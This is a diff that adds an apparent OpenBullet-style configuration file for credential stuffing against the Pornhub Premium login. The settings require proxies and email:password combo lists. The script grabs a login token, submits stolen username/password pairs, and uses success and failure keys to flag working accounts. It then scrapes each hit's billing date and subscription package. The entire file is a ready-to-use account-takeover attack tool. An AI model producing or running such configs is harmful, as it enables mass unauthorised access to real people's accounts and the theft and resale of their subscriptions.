@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "PornHub",
+  "SuggestedBots": 99,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-04T14:15:16.6079441+03:30",
+  "AdditionalInfo": "",
+  "Author": "\"@amandeep"",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.pornhubpremium.com/premium/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"token\":\"" "\",\"" -> VAR "token" 
+
+FUNCTION Constant "<token>" -> VAR "TOKAN" 
+
+REQUEST POST "https://www.pornhubpremium.com/front/authenticate" 
+  CONTENT "username=<USER>&password=<PASS>&token=<TOKAN>&redirect=&from=pc_premium_login&segment=straight" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Host: www.pornhubpremium.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.pornhubpremium.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "DNT: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Referer: https://www.pornhubpremium.com/premium/login" 
+  HEADER "Accept-Language: en,en-US;q=0.9,ar;q=0.8" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"success\":\"1\"" 
+  KEYCHAIN Failure OR 
+    KEY "\":\"Invalid username" 
+    KEY "\":\"\",\"premium_redirect_cookie\":\"0\"," 
+
+REQUEST GET "https://www.pornhubpremium.com/user/manage/start" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<p id=\"expiryDatePremium\">Next Billing Date " "</date></p>" -> CAP "Renew" 
+
+PARSE "<SOURCE>" LR "\"Latest Product Used\":\"" "\",\"" -> CAP "Package" "" " | Config By @amandeep |" 
+
